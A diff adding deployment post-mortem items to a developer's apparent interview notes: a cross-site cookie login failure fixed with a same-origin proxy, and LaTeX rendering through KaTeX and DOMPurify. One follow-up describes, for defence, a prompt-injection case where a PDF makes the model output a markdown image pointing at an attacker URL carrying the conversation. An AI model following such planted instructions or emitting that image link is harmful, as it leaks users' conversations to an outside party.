@@ -451,6 +451,46 @@ chat, summary, assessment, delete and logout.
 
 ---
 
+## Phase 9: problems found after deploying
+
+### 33. Logging in on a phone looped back to the login page
+- **What was wrong:** the site (Vercel) called the API on another site
+  (Render), so the login cookie was a third-party cookie. Safari on iPhone
+  and several other browsers block those: the login response arrived but the
+  cookie wasn't stored, and the next request got a 401. Desktop Chrome still
+  allows them, which is why it only failed on phones. Before the dashboard
+  checked the login, the same bug showed up as "please log in" errors.
+- **In 30 seconds:** "I reproduced it with Chrome's third-party cookie
+  blocking and a cross-site local setup: login 200, check-login 401. The fix
+  is to make the API same-origin: `vercel.json` forwards `/api/*` to Render
+  and the app calls `/api`, so the cookie belongs to the site itself. With
+  blocking on, the dashboard now opens. I also turned off Vercel's caching
+  for `/api`, because a cached per-user response could be served to someone
+  else."
+- **Follow-up:** *What does the proxy cost?* One extra hop through Vercel's
+  network, and a 120-second limit on how long Vercel waits for the API,
+  which is enough for a summary even when Render is waking up. In return
+  there's no CORS preflight on every request.
+
+### 34. Formulas showed up as `$\mu_E$`
+- **What was wrong:** Gemini writes math in LaTeX, and the app showed the
+  source text.
+- **In 30 seconds:** "All model text now goes through one renderer: marked
+  with two small extensions for `$...$`, `$$...$$`, `\(...\)` and `\[...\]`,
+  KaTeX, then DOMPurify. Single `$` follows Pandoc's rule so '$5 and $10'
+  stays text. I tested it with a nasty answer: prices, escaped dollars, code
+  spans, injected HTML and images."
+- **Follow-up:** *Why block images in answers?* Prompt injection: a PDF can
+  tell the model to write `![x](https://attacker/?q=<the conversation>)`, and
+  the browser would fetch that URL just by showing the answer. The app never
+  needs images there, so they are removed, and so is `url(...)` in styles.
+- **Follow-up:** *KaTeX is big. Did that slow the site down?* It added about
+  80 KB (gzipped) to the one bundle everybody downloaded, so I made the
+  dashboard a lazily loaded chunk. The home page now downloads 81 KB of
+  JavaScript instead of 132 KB.
+
+---
+
 ## What I'd still change (say this before they ask)
 
 - Show saved conversations in the app, and also save when leaving the
